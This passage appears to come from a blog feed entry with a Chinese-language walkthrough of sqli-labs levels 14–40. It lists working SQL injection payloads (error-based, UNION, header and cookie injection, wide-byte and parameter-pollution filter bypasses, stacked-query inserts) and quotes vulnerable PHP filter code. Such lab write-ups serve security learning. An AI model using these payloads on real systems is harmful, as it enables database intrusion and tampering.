sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1" and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>)));%23&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><h3 id="Less-15-Less-16"><a href="#Less-15-Less-16" class="headerlink" title="Less-15 Less-16"></a>Less-15 Less-16</h3><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>利用 update 注入，有明显的报错信息，可以报错注入，并且没有验证之前的密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=11'and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>))<span class="comment">#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h3 id="Less-18-Header-Injection-Uagent-field-Error-based"><a href="#Less-18-Header-Injection-Uagent-field-Error-based" class="headerlink" title="Less-18 Header Injection  - Uagent field - Error based"></a>Less-18 Header Injection  - Uagent field - Error based</h3><p>UA 注入，要先登录才有回显，注意闭合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>)) <span class="keyword">and</span> <span class="string">'</span></span><br></pre></td></tr></table></figure><h3 id="Less-19-Header-Injection-Referer-field-Error-based"><a href="#Less-19-Header-Injection-Referer-field-Error-based" class="headerlink" title="Less-19 Header Injection  - Referer field - Error based"></a>Less-19 Header Injection  - Referer field - Error based</h3><h3 id="Less-20-Cookie-injection-Uagent-field-Error-based"><a href="#Less-20-Cookie-injection-Uagent-field-Error-based" class="headerlink" title="Less-20 Cookie injection - Uagent field - Error based"></a>Less-20 Cookie injection - Uagent field - Error based</h3><p>cookie 注入，同样有报错，改了cookie后不会影响登录状态吗？</p><h3 id="Less-21-Less-22-与前面的类似"><a href="#Less-21-Less-22-与前面的类似" class="headerlink" title="Less-21 Less-22 与前面的类似"></a>Less-21 Less-22 与前面的类似</h3><h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><p>发现 <code>#, --</code> 被过滤，可换 <code>;%00</code>，或者直接闭合单引号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="string">'3</span></span><br><span class="line"><span class="string">?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">database</span>();%00</span><br><span class="line">?id=-1'union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span>),<span class="string">'3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 报错注入</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>)));%00</span><br></pre></td></tr></table></figure><h3 id="Less-24-Second-Oder-Injections-Real-treat-Stored-injection"><a href="#Less-24-Second-Oder-Injections-Real-treat-Stored-injection" class="headerlink" title="Less-24 Second Oder Injections Real treat - Stored injection"></a>Less-24 Second Oder Injections <em>Real treat</em> - Stored injection</h3><p>二次排序注入，将可能导致 sql 注入的字符先存入数据库，当再次调用这个恶意构造的字符时，就可以触发注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">'$pass'</span> <span class="keyword">where</span> username=<span class="string">'$username'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$curr_pa'</span>;</span><br></pre></td></tr></table></figure><p>对于本题的 <code>sql</code> 语句来说，如果先注册一个 <code>admin&#39;#</code> 用户，此用户改密码的时候也修改了 <code>admin</code> 的密码。</p><p>所以有无严格控制用户的输入对安全影响特别大。</p><h3 id="Less-25-Error-Based-All-your-OR-amp-AND-belong-to-us-integer-based"><a href="#Less-25-Error-Based-All-your-OR-amp-AND-belong-to-us-integer-based" class="headerlink" title="Less-25 Error Based - All your OR &amp; AND belong to us - integer based"></a>Less-25 Error Based - All your OR &amp; AND belong to us - integer based</h3><p>题意是说过滤了 <code>or, and</code>，并且展示了过滤后的字符串在下方，同时也有报错，所以方法很多</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2' union <span class="keyword">select</span> <span class="number">1</span>, <span class="keyword">database</span>(), <span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><p><code>or, and</code> 可以用 <code>||, &amp;&amp;</code> 代替，本题还可用 <code>o/**/r</code> 或者 <code>oorr</code></p><h3 id="Less-25a-Blind-Based-All-your-OR-amp-AND-belong-to-us-integer-based"><a href="#Less-25a-Blind-Based-All-your-OR-amp-AND-belong-to-us-integer-based" class="headerlink" title="Less-25a Blind Based - All your OR &amp; AND belong to us - integer based"></a>Less-25a Blind Based - All your OR &amp; AND belong to us - integer based</h3><p>与 Less-25 大同小异</p><h3 id="Less-26-Error-based-All-your-SPACES-and-COMMENTS-belong-to-us（待研究）"><a href="#Less-26-Error-based-All-your-SPACES-and-COMMENTS-belong-to-us（待研究）" class="headerlink" title="Less-26 Error based - All your SPACES and COMMENTS belong to us（待研究）"></a>Less-26 Error based - All your SPACES and COMMENTS belong to us（待研究）</h3><p>尝试了所有的空白符，居然都不行，有个 <code>%a0</code> 没被过滤，但是不解析，不过 Linux 上可以成功解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span> </span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out --</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out #</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);<span class="comment">//过滤空白符，如换行、换页、空格、制表符</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out slashes</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27union%a0select%a01,database(),3;%00  <span class="comment">-- linux（phpstudy上不解析，待研究）</span></span><br><span class="line">?id=0%27union(<span class="keyword">select</span>(<span class="number">1</span>),<span class="keyword">database</span>(),<span class="number">3</span>);%00  <span class="comment">-- 直接用括号分隔</span></span><br><span class="line">?id=-1%27anandd(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">user</span>())),<span class="number">0x7e</span>)));%00</span><br></pre></td></tr></table></figure><h3 id="Less-26a-Blind-based-All-your-SPACES-and-COMMENTS-belong-to-us"><a href="#Less-26a-Blind-based-All-your-SPACES-and-COMMENTS-belong-to-us" class="headerlink" title="Less-26a Blind based - All your SPACES and COMMENTS belong to us"></a>Less-26a Blind based - All your SPACES and COMMENTS belong to us</h3><p>多了个 <code>()</code> ，没有报错回显，依然 <code>%a0</code>，也可以盲注</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>%<span class="number">27</span>)<span class="class"><span class="keyword">union</span>(<span class="title">select</span>(1),<span class="title">database</span>(),3);</span>%<span class="number">0</span>0</span><br></pre></td></tr></table></figure><h3 id="Less-27-Error-based-All-your-UNION-and-SELECT-belong-to-us"><a href="#Less-27-Error-based-All-your-UNION-and-SELECT-belong-to-us" class="headerlink" title="Less-27 Error based - All your UNION and SELECT belong to us"></a>Less-27 Error based - All your UNION and SELECT belong to us</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span> </span>&#123;</span><br><span class="line">    $id= preg_replace(<span class="string">'/[\/\*]/'</span>, <span class="string">""</span>, $id);<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>, <span class="string">""</span>, $id);<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>, <span class="string">""</span>, $id);<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>, <span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/m'</span>, <span class="string">""</span>, $id);<span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>, <span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union/s'</span>, <span class="string">""</span>, $id);    <span class="comment">//Strip out union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/s'</span>, <span class="string">""</span>, $id);<span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">'/UNION/s'</span>, <span class="string">""</span>, $id);    <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">'/SELECT/s'</span>, <span class="string">""</span>, $id);<span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Union/s'</span>, <span class="string">""</span>, $id);    <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Select/s'</span>, <span class="string">""</span>, $id);<span class="comment">//Strip out select</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>select, union, 空格</code> 过滤不彻底</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>%<span class="number">27</span>and(extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(seLect%<span class="number">0</span>aflag%<span class="number">0</span>afrom%<span class="number">0</span>aflag),<span class="number">0x7e</span>)));%<span class="number">00</span></span><br></pre></td></tr></table></figure><h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">0</span><span class="string">"%0aUnIon%0aSElecT%0a1,(SeLect%0aflag%0afrom%0aflag),"</span><span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="string">'/union\s+select/i'</span>, <span class="string">""</span>, $id);    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br></pre></td></tr></table></figure><p>不能同时出现 <code>union select</code>，还是遇到了之前那个 <code>%a0</code> 不解析的问题，但是可以 <code>union all select</code>，科学计数法 <code>0e1union</code> 也不行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0')%0aunion%0aall%0aseLect%0a1,2,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database();%00</span><br></pre></td></tr></table></figure><p>如果可以报错注入的话</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2')%0aand%0a(extractvalue(1,concat(0x7e,(<span class="keyword">seLect</span>%<span class="number">0</span>agroup_concat(table_name)%<span class="number">0</span>afrom%<span class="number">0</span>ainformation_schema.tables%<span class="number">0</span>awhere%<span class="number">0</span>atable_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>)));%00</span><br></pre></td></tr></table></figure><h3 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h3><p>与 28 差不多，并且过滤还减少了。。</p><h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h3><p>一旦输入不是数字，直接跳到 <code>hacked.php</code>，一看源码可知存在 <code>HPP</code>即参数污染，这实际上是一个逻辑问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$qs = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line">$id1 = java_implimentation($qs);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数污染在这里，php 同时接到两个一样的参数，以后一个为准</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">whitelist($id1);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;  <span class="comment">// 为啥不插 $id1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">$match = preg_match(<span class="string">"/^\d+$/"</span>, $input);</span><br><span class="line"><span class="keyword">if</span> (!$match) &#123;</span><br><span class="line">header(<span class="string">'Location: hacked.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一找到 id 就返回，即返回的是第一个 id 的值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span><span class="params">($query_string)</span> </span>&#123;</span><br><span class="line">$q_s = $query_string;</span><br><span class="line">$qs_array= explode(<span class="string">"&amp;"</span>,$q_s);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($qs_array <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">$val=substr($value,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span>($val==<span class="string">"id"</span>) &#123;</span><br><span class="line">$id_value=substr($value,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line"><span class="keyword">return</span> $id_value;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题一旦发现是参数污染，即入无人之境，毫无过滤。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2&amp;id=0' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h3><p>与 29 同，只是拼接了一个 <code>“”</code>。</p><h3 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h3><p>在前面的基础上又加了一个 <code>()</code>。</p><hr><p>Less-32,33,34,35,36,37六关全部是针对 <code>’</code> 和  <code>\</code> 的过滤，可用宽字节绕过</p><p>原理：<code>mysql</code> 在使用 <code>gbk</code> 编码的时候，会将两个字符当做一个汉字。例如 <code>%aa%5c</code> ，前一个 <code>ASCII</code> 码超过 <code>128</code> 才会达到汉字的范围。</p><h3 id="Less-32-Bypass-custom-filter-adding-slashes-to-dangerous-chars"><a href="#Less-32-Bypass-custom-filter-adding-slashes-to-dangerous-chars" class="headerlink" title="Less-32 Bypass custom filter adding slashes to dangerous chars"></a>Less-32 Bypass custom filter adding slashes to dangerous chars</h3><p>干掉 slash 有如下方法</p><p>1、<code>%df</code>  吃掉 <code>\</code>   具体的原因是 <code>urlencode(‘)  = %5c%27</code>，我们在 <code>%5c%27</code> 前面添加 <code>%df</code>，形成 <code>%df%5c%27</code>，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此时 <code>%df%5c</code> 就是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。<br>2、将 <code>\’</code> 中的 <code>\</code> 过滤掉，例如可以构造 <code>%**%5c%5c%27</code> 的情况，后面的 <code>%5c</code> 会被前面的 <code>%5c</code> 给注释掉。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%df' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>那第二种方法？</p><h3 id="Less-33-Bypass-addslashes"><a href="#Less-33-Bypass-addslashes" class="headerlink" title="Less-33 Bypass addslashes()"></a>Less-33 Bypass addslashes()</h3><p><code>Addslashes()</code> 函数依旧可以利用 <code>%df</code> 进行绕过。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">下列字符将被加上 <span class="symbol">\ </span>进行转义</span><br><span class="line">单引号（'）双引号（"）反斜杠（<span class="symbol">\）</span>NULL</span><br></pre></td></tr></table></figure><p><strong>Notice：</strong>使用 <code>addslashes()</code> ，我们需要将 <code>mysql_query</code> 设置为 <code>binary</code> 的方式，才能防御此漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(“SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn);</span><br></pre></td></tr></table></figure><h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><p>此处是 <code>post</code>，将 <code>utf-8</code> 转换为 <code>utf-16</code> 或 <code>utf-32</code>，例如将 <code>‘</code>  转为 <code>utf-16</code>为  �’  </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=�' <span class="keyword">or</span> 1#&amp;<span class="attribute">passwd</span>=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure><h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><p>35 关和 33关是大致的一样的，唯一的区别在于 <code>sql</code> 语句的不同。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=$<span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>没有 <code>‘</code>，就没必考虑 <code>addslashes()</code> 函数的意义了</p><h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$string = mysql_real_escape_string($string);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下列字符将受影响</span></span><br><span class="line">\x00\n\r\<span class="string">'"\x1a</span></span><br></pre></td></tr></table></figure><p>依然宽字节注入</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span><span class="symbol">%EF</span><span class="symbol">%BF</span><span class="symbol">%BD</span><span class="symbol">%27</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><p><strong>Notice:</strong><br>在使用 <code>mysql_real_escape_string()</code> 时，需要将 <code>mysql</code> 设置为 <code>gbk</code> 即可。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">mysql_set_charset</span><span class="params">(‘gbk’,’<span class="variable">$conn</span>’)</span></span></span><br></pre></td></tr></table></figure><h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h3><p>利用 34 关的 payload</p><hr><p>以下正式进入堆叠注入，即</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>; <span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure><p>由于 <code>sql</code> 语句是以 <code>;</code> 分隔，所以在查询语句的基础，我们还可以加多条语句。</p><hr><h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><p>没有什么过滤，可以为所欲为，比如直接插入数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1%27;<span class="keyword">insert</span>%<span class="number">20</span><span class="keyword">into</span>%<span class="number">20</span><span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>)%<span class="number">20</span><span class="keyword">values</span>%<span class="number">20</span>(%<span class="number">2738</span>%<span class="number">27</span>,%<span class="number">27</span>less38%<span class="number">27</span>,%<span class="number">27</span>hello%<span class="number">27</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h3><p>同 38，只是没有 <code>‘’</code>。</p><h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h3><p>没有任何防护，得到字段名之后就可以直接往里插入数据</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>;%<span class="number">20</span>insert%<span class="number">20</span>into%<span class="number">20</span>users(id,username,password)%<span class="number">20</span>values%<span class="number">20</span>(%<span class="number">27110</span>%<span class="number">27</span>,%<span class="number">27</span>less41%<span class="number">27</span>,%<span class="number">27</span>hello%<span class="number">27</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure><blockquote><p>做到这里有点无聊就没做了，待更新。</p></blockquote><h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h3><h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h3><h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h3><h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h3><h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h3><h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h3><p><code>order by</code> 配合 <code>rand()</code> </p><h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><h3 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h3><h3 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h3><h3 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h3><h3 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h3><h3 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h3><h3 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h3><h3 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h3><h3 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h3><h3 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h3><h3 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;预备知识&quot;&gt;&lt;a href=&quot;#预备知识&quot; class=&quot;headerlink&quot; title=&quot;预备知识&quot;&gt;&lt;/a&gt;预备知识&lt;/h2&gt;&lt;h3 id=&quot;MySQL-常用语句备忘&quot;&gt;&lt;a href=&quot;#MySQL-常用语句备忘&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="SQLi" scheme="https://wywwzjj.top/tags/SQLi/"/>
    
  </entry>
  
</feed>
